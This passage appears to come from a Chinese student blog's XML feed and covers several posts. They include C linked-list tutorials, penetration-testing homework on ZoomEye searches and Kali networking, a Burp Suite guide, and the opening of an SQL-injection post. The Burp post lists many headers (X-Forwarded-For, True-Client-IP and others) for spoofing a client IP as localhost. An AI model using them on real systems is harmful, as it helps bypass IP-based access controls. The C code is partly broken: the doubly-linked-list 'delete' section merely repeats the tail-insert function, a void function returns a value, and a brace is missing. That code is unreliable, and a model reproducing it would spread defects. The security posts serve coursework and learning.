        <content type="html"><![CDATA[<h1 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h1><h2 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">DataType data;   <span class="comment">//数据域 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span>   <span class="comment">//指针域 </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">PNode</span>;</span>  <span class="comment">//节点类型定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span>  <span class="comment">//单链表类型定义 </span></span><br></pre></td></tr></table></figure><h2 id="创建链表"><a href="#创建链表" class="headerlink" title="创建链表"></a>创建链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span> (head != <span class="literal">NULL</span>) head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Head</span><span class="params">(<span class="keyword">struct</span> Node* head)</span>   <span class="comment">//用头插法创建单链表 </span></span><br><span class="line">&#123;</span><br><span class="line">PNode p=<span class="literal">NULL</span>;   <span class="comment">//临时使用 </span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; 头插法，请输入整形数据建立链表，以 -1 结束\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line"><span class="keyword">while</span>(data!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node)); <span class="comment">//分配空间 </span></span><br><span class="line">p -&gt; data=data;  <span class="comment">//对数据域赋值 </span></span><br><span class="line">p -&gt;next = head -&gt;next;  <span class="comment">//对next域赋值 </span></span><br><span class="line">head -&gt; next =p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node* head)</span><span class="comment">//用尾插法建立链表 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">p</span>=</span><span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">q</span>=</span>head;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data); </span><br><span class="line"><span class="keyword">while</span>(data!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//分配空间 </span></span><br><span class="line">p -&gt; data=data;<span class="comment">//数据域赋值 </span></span><br><span class="line">p -&gt;next =<span class="literal">NULL</span>;<span class="comment">//指针域赋值 </span></span><br><span class="line">q -&gt;next =p;</span><br><span class="line">q=p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="输出链表"><a href="#输出链表" class="headerlink" title="输出链表"></a>输出链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(LinkList head)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p=head -&gt; next;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,p -&gt; data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="插入算法"><a href="#插入算法" class="headerlink" title="插入算法"></a><strong>插入算法</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPost_link</span><span class="params">(LinkList llist,DataType x,DataType y)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p =llist;</span><br><span class="line">    PNode Newp=(PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    Newp -&gt; data=y;</span><br><span class="line">    Newp -&gt; next =<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (p -&gt; data==x)</span><br><span class="line">        &#123;</span><br><span class="line">            Newp -&gt; next=p -&gt; next;</span><br><span class="line">            p -&gt;next =Newp;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p=p -&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;not exist data %d\n&quot;</span>,x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除算法"><a href="#删除算法" class="headerlink" title="删除算法"></a>删除算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelNode_Link</span><span class="params">(LinkList head,<span class="type">int</span> deldata)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(head==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">PNode prees=head;</span><br><span class="line">PNode current=head -&gt; next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="keyword">if</span>(current -&gt; data == deldata)</span><br><span class="line">&#123;</span><br><span class="line">prees -&gt; next = current -&gt; next;</span><br><span class="line"><span class="built_in">free</span>(current);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">prees=current;</span><br><span class="line">current=current -&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;not exist %d\n&quot;</span>,deldata);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将尾结点连接到头结点</span></span><br><span class="line"></span><br><span class="line">PNode <span class="title function_">buildCircularLinkedList</span><span class="params">(<span class="type">int</span> n, PNode tail)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode current=<span class="literal">NULL</span>, prev;</span><br><span class="line">    prev = tail; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        current = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;current-&gt;data);</span><br><span class="line">        prev-&gt;next = current;</span><br><span class="line">        prev = current;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = current;</span><br><span class="line">    <span class="keyword">return</span> tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h1><h2 id="类型定义-1"><a href="#类型定义-1" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pre</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">PNode</span>;</span></span><br></pre></td></tr></table></figure><h2 id="创建链表-1"><a href="#创建链表-1" class="headerlink" title="创建链表"></a>创建链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetList_Link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList head=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">head-&gt;data=<span class="number">0</span>;</span><br><span class="line">head-&gt;pre=<span class="literal">NULL</span>;</span><br><span class="line">head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="头插法-1"><a href="#头插法-1" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">HeadInsert</span><span class="params">(LinkList head,<span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">   newNode-&gt;data = data;</span><br><span class="line">   newNode-&gt;pre = head;</span><br><span class="line">   newNode-&gt;next = head-&gt;next;</span><br><span class="line">   <span class="keyword">if</span>(head-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      head-&gt;next-&gt;pre = newNode;</span><br><span class="line">   &#125;</span><br><span class="line">   head-&gt;next = newNode;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="尾插法-1"><a href="#尾插法-1" class="headerlink" title="尾插法"></a>尾插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TailInsert</span><span class="params">(LinkList head, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="输出链表-1"><a href="#输出链表-1" class="headerlink" title="输出链表"></a>输出链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(LinkList head)</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList PrintList=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(PrintList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;&quot;</span>,PrintList-&gt;data);</span><br><span class="line">PrintList=PrintList-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TailInsert</span><span class="params">(LinkList head, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="插入算法-1"><a href="#插入算法-1" class="headerlink" title="插入算法"></a>插入算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertAfterElement</span><span class="params">(LinkList head, <span class="type">int</span> target, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data == target) &#123;</span><br><span class="line">            PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line"></span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                p-&gt;next-&gt;pre = newNode;</span><br><span class="line">            &#125;</span><br><span class="line">            newNode-&gt;pre = p;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line"></span><br><span class="line">            head-&gt;data++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target element not found\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业No2</title>
      <link href="/2023/12/06/%E4%BD%9C%E4%B8%9A2/"/>
      <url>/2023/12/06/%E4%BD%9C%E4%B8%9A2/</url>
      
        <content type="html"><![CDATA[<h1 id="题目汇总"><a href="#题目汇总" class="headerlink" title="题目汇总"></a>题目汇总</h1><p>1.与ZoomEye功能类似的搜索引擎还有哪些？</p><p>2.利用ZoomEye进行相关搜索，截图，发布到自己的Blog。</p><p>3.子域名收集，截图。</p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p>与ZoomEye功能类似的搜索引擎还有哪些？</p><p> 回答： 除了ZoomEye之外，还有一些功能类似的搜索引擎，包括：</p><ol><li><p>Shodan：Shodan是一个面向物联网设备的搜索引擎，可以搜索全球范围内连接到互联网的设备，包括路由器、摄像头、服务器等等。用户可以使用Shodan搜索设备，发现漏洞，探查设备安全性等。</p></li><li><p>BinaryEdge：BinaryEdge是一款面向企业的安全分析工具，提供网络情报、风险评估、漏洞扫描等功能。与ZoomEye类似，BinaryEdge可以搜索Internet上所有的设备和服务，并对其进行评估和分类。</p></li><li><p>Censys：Censys是一个面向互联网设备和服务的搜索引擎，可以帮助用户发现全球范围内的漏洞和威胁。它可以搜索IPv4和IPv6地址、证书、域名、协议等信息。</p></li><li><p>Fofa Pro：Fofa Pro是一款面向企业的网络安全搜索引擎，可以搜索包括IP地址、域名、子域名、端口、关键词等信息。它可以帮助用户发现互联网上的资产和漏洞，评估企业的安全风险。</p></li></ol><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p>利用ZoomEye进行相关搜索，截图，发布到自己的Blog</p><p>回答：搜索  领势 Compact Wireless-G 网络视频摄像机 http服务器</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A2.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-12-06113341.png"></p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p>子域名收集，截图。</p><p>回答：搜索 <a href="https://www.baidu.com/">百度</a> 的子域名</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A2.assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2023-12-06113825.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>作业No1</title>
      <link href="/2023/12/05/%E4%BD%9C%E4%B8%9A1/"/>
      <url>/2023/12/05/%E4%BD%9C%E4%B8%9A1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目汇总"><a href="#题目汇总" class="headerlink" title="题目汇总"></a>题目汇总</h1><p>1、Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？<br>2、Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？<br>3、对于1、2的结果，进行总结分析。<br>注：网络配置发生变化，建议重启网卡（操作命令见PPT）<br>作业发布到自己blog备查。</p><h1 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h1><p>Kali虚拟机采用桥接模式；物理机连接Guet-WiFi，Kali中查看网络配置并截图，能获得IP地址吗？</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05134440.png"></p><p>回答：不能</p><h1 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h1><p>Kali虚拟机采用桥接模式；物理机连接手机热点，Kali中查看网络配置并截图，能获得IP地址吗？</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05134748.png"></p><p>回答：能</p><h1 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h1><p>对于1、2的结果，进行总结分析。</p><p><img src="/../images/%E4%BD%9C%E4%B8%9A1.assets/image-2023-12-05135040.png"></p><p>回答：Guet-WiFi会给物理机分配ip，不会给虚拟机分配ip</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit使用</title>
      <link href="/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/11/22/burpsuite%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="更改数据包"><a href="#更改数据包" class="headerlink" title="更改数据包"></a>更改数据包</h1><h2 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h2><p>将请求改为如下</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/20210307160419616.png" alt="img"></p><h2 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h2><p>使用POST提交方法和GET类似，将GET改为POST，在末尾添加b&#x3D;2，此时记得添加Content-Type: application&#x2F;x-www-form-urlencoded</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1podW9xaWFuXzE=,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="伪造IP"><a href="#伪造IP" class="headerlink" title="伪造IP"></a>伪造IP</h2><p>随便加一行：</p><p>X-Forwarded-For:127.0.0.1<br>X-Forwarded:127.0.0.1<br>Forwarded-For:127.0.0.1<br>Forwarded:127.0.0.1<br>X-Forwarded-Host:127.0.0.1<br>X-remote-IP:127.0.0.1<br>X-remote-addr:127.0.0.1<br>True-Client-IP:127.0.0.1<br>X-Client-IP:127.0.0.1<br>Client-IP:127.0.0.1<br>X-Real-IP:127.0.0.1<br>Ali-CDN-Real-IP:127.0.0.1<br>Cdn-Src-Ip:127.0.0.1<br>Cdn-Real-Ip:127.0.0.1<br>CF-Connecting-IP:127.0.0.1<br>X-Cluster-Client-IP:127.0.0.1<br>WL-Proxy-Client-IP:127.0.0.1<br>Proxy-Client-IP:127.0.0.1<br>Fastly-Client-Ip:127.0.0.1<br>True-Client-Ip:127.0.0.1</p><h2 id="伪造浏览器和设备"><a href="#伪造浏览器和设备" class="headerlink" title="伪造浏览器和设备"></a>伪造浏览器和设备</h2><p>修改User-Agent</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/49ce71eee9ae4be493f524a6b7c55ef4.png" alt="img"></p><h2 id="伪造网址"><a href="#伪造网址" class="headerlink" title="伪造网址"></a>伪造网址</h2><p>修改referer</p><p><img src="/../images/burpsuite%E4%BD%BF%E7%94%A8.assets/e1f82347a0de4a8193faac4b54fcf703.png" alt="img"></p><h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2023/11/20/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/11/20/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL操作"><a href="#MySQL操作" class="headerlink" title="MySQL操作"></a>MySQL操作</h1><h2 id="登陆："><a href="#登陆：" class="headerlink" title="登陆："></a>登陆：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u [用户名] <span class="operator">-</span>p</span><br></pre></td></tr></table></figure><h2 id="查询用户名所有数据库："><a href="#查询用户名所有数据库：" class="headerlink" title="查询用户名所有数据库："></a>查询用户名所有数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br></pre></td></tr></table></figure><h2 id="创建数据库："><a href="#创建数据库：" class="headerlink" title="创建数据库："></a>创建数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database [数据库名]；</span><br></pre></td></tr></table></figure><h2 id="删除数据库："><a href="#删除数据库：" class="headerlink" title="删除数据库："></a>删除数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> database [数据库名] ;</span><br></pre></td></tr></table></figure><h2 id="使用数据库："><a href="#使用数据库：" class="headerlink" title="使用数据库："></a>使用数据库：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use [数据库名];</span><br></pre></td></tr></table></figure><h2 